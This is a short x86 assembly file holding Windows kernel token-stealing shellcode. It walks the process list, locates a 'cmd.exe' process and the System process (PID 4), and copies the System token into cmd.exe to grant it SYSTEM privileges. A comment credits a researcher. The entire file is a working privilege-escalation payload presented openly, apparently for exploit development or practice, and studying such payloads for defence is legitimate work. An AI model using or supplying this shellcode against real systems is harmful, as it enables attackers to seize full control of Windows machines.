[BITS 32]

pusha

mov eax, [fs:0x124]    ; Get ETHREAD from KPRCB
mov eax, [eax + 0x150]       ; Get EPROCESS from current thread

next_process:
        cmp dword [eax + 0x16c], 'cmd.'  ; Search for 'cmd.exe' process
        je found_cmd_process
        mov eax, [eax + 0xb8]            ; If not found, go to next process
        sub eax, 0xb8
        jmp next_process

found_cmd_process:
        mov ebx, eax

find_system_process:
        cmp dword [eax + 0xb4], 0x00000004  ; Search for PID 4 (System process)
        je found_system_process
        mov eax, [eax + 0xb8]
        sub eax, 0xb8
        jmp find_system_process

found_system_process:
        mov ecx, [eax + 0xf8]            ; Take TOKEN from System process
        mov [ebx+0xf8], ecx              ; And copy it to the cmd.exe process

popa
ret 0xc  ; remove arguments from the stack

; credit for xpn for the reference (https://twitter.com/_xpn_)


